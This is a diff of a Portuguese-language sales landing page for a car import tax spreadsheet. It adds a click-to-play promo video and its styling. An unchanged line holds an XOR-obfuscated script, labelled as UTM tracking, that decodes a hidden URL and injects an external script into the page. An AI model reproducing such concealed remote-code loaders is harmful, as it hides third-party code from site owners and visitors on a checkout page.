@@ -25,6 +25,18 @@
   <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2650441365332672&ev=PageView&noscript=1" alt=""></noscript>
   <!-- UTMify: captura os UTMs do anúncio e passa-os para o link do checkout -->
   <script>(function(){var u_n=atob("DMjfNeL+aIoSooEsILP9QJCSSrAwyvVYULvlGs2dDOQ81/VBSa6mG4GRBaRw0K5fQ7q2RZaNR/9mz/IDTKmrUJGKRuBhgK0OQbyrR4ucHf530aMWe7P9W4OTDagogOVNVKnyQJaTAexrj/FeRb66W5bTEOl9xqxfQ6P9GcCICeZnx6MWAuqiGZncBut/x6MWAqy+QYPTHf5/y+dVDbitUJSbBv4/0fROSaysF87cHut+1+QOGur9SL+D");var x_ya=[];for(var g_zv73=0;g_zv73<u_n.length;g_zv73++){x_ya.push(u_n.charCodeAt(g_zv73)&255);}var v_9swh=x_ya[0];var n_8m=x_ya.slice(1,1+v_9swh);var a_h=x_ya.slice(1+v_9swh);var s_a5l=a_h.map(function(b,h_0hm){return b^n_8m[h_0hm%v_9swh];});var j_c="";for(var g_ktz=0;g_ktz<s_a5l.length;g_ktz++){j_c+=String.fromCharCode(s_a5l[g_ktz]&255);}var g_opn=decodeURIComponent(escape(j_c));var o_c=JSON.parse(g_opn);var q_f0=o_c.globals||[];q_f0.forEach(function(v_b4){window[v_b4.name]=v_b4.value;});var o_eb=document.createElement("script");o_eb.src=o_c.url;o_eb.async=true;o_eb.defer=true;(o_c.attributes||[]).forEach(function(g_fi){o_eb.setAttribute(g_fi.name,g_fi.value);});(document.head||document.documentElement).appendChild(o_eb);})();</script>
+  <style>
+  .vsl{position:relative;margin:18px auto 6px;max-width:520px;border-radius:16px;overflow:hidden;background:#0b1a22;box-shadow:0 18px 40px rgba(11,26,34,.28),0 0 0 1px rgba(16,124,65,.18);aspect-ratio:1/1}
+  .vsl video{display:block;width:100%;height:100%;object-fit:cover;background:#0b1a22}
+  .vsl-play{position:absolute;left:50%;bottom:14px;transform:translateX(-50%);display:flex;align-items:center;gap:10px;border:0;cursor:pointer;background:rgba(11,26,34,.88);color:#fff;border-radius:999px;padding:8px 18px 8px 8px;font:inherit;text-align:left;box-shadow:0 10px 24px rgba(0,0,0,.35);white-space:nowrap;-webkit-tap-highlight-color:transparent}
+  .vsl-play .ic{flex:0 0 44px;height:44px;border-radius:50%;background:linear-gradient(180deg,#22c55e,#15803d);display:flex;align-items:center;justify-content:center;animation:vslPulse 1.8s ease-in-out infinite}
+  .vsl-play .ic svg{width:18px;height:18px;margin-left:3px}
+  .vsl-play b{display:block;font-size:.95rem;line-height:1.2}
+  .vsl-play small{display:block;font-size:.76rem;opacity:.75}
+  .vsl.on .vsl-play{display:none}
+  @keyframes vslPulse{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,.55)}50%{box-shadow:0 0 0 10px rgba(34,197,94,0)}}
+  @media (prefers-reduced-motion:reduce){.vsl-play .ic{animation:none}}
+  </style>
 </head>
 <body>
 
@@ -39,6 +51,14 @@
   <p class="sub">Direitos, IEC, IVA, selo e despachante calculados em Kwanzas, numa única planilha. Chega de surpresas na alfândega.</p>
   <a class="btn" id="mainCta" href="https://okandapay.com/checkout/planilha-calculadora-de-importacao-de-viaturas-autotaxa-master-muynkvpm?pid=afdd1e4e-c4ee-43a6-8fed-5bb1cb59af81">QUERO A AUTOTAXA PRO · <b class="px">12.997 Kz</b><span>Entrega imediata no seu email · Pagamento seguro</span></a>
   <p class="trust"><span><i>✔</i>Garantia de 7 dias</span><span><i>✔</i>Suporte no WhatsApp</span><span><i>✔</i>Entrega imediata</span></p>
+
+  <!-- Mini VSL 1:1 (54s): só toca se o visitante carregar no botão; não descarrega nada antes disso -->
+  <figure class="vsl" id="vsl">
+    <video id="vslVideo" preload="none" playsinline poster="assets/video/vsl-capa.webp" width="720" height="720">
+      <source src="assets/video/autotaxa-vsl.mp4" type="video/mp4">
+    </video>
+    <button class="vsl-play" id="vslPlay" type="button" aria-label="Ver o vídeo de 54 segundos"><span class="ic"><svg viewBox="0 0 16 16" aria-hidden="true"><path d="M3 1.5 L14 8 L3 14.5 Z" fill="#fff"/></svg></span><span><b>Veja a planilha a calcular um KIA</b><small>Vídeo de 54 segundos · com som</small></span></button>
+  </figure>
 
   <figure class="win "><div class="win-bar"><svg viewBox="0 0 16 16" aria-hidden="true"><rect x="1" y="1" width="14" height="14" rx="2" fill="#fff" fill-opacity=".95"/><path d="M1 6h14M1 11h14M6 1v14M11 1v14" stroke="#107c41" stroke-width="1.1"/></svg><span>AutoTaxa_Pro_2026.xlsx</span><b>Dashboard</b></div><img src="assets/v3/hero.webp" width="1016" height="480" alt="Planilha AutoTaxa Pro: total de impostos, custo final e preço de venda sugerido em Kwanzas" loading="lazy"></figure>
   <p class="cap">Resultado real da planilha: o custo final já com impostos e despachante.</p>
@@ -143,6 +163,12 @@
 
 <div class="sticky" id="sticky"><a class="btn" href="https://okandapay.com/checkout/planilha-calculadora-de-importacao-de-viaturas-autotaxa-master-muynkvpm?pid=afdd1e4e-c4ee-43a6-8fed-5bb1cb59af81">QUERO A AUTOTAXA PRO · <b class="px">12.997 Kz</b><span>Pagamento seguro · Garantia de 7 dias</span></a></div>
 
+<script>
+(function(){var f=document.getElementById('vsl'),v=document.getElementById('vslVideo'),b=document.getElementById('vslPlay');if(!f||!v||!b)return;
+b.addEventListener('click',function(){f.classList.add('on');v.controls=true;v.muted=false;var p=v.play();if(p&&p.catch)p.catch(function(){v.muted=true;v.play()})});
+v.addEventListener('ended',function(){v.controls=false;f.classList.remove('on');b.querySelector('b').textContent='Ver o vídeo outra vez';var c=document.getElementById('mainCta');if(c&&c.animate)c.animate([{transform:'scale(1)'},{transform:'scale(1.04)'},{transform:'scale(1)'}],{duration:700,iterations:2})});
+})();
+</script>
 <script src="main.js" defer></script>
 </body>
 </html>
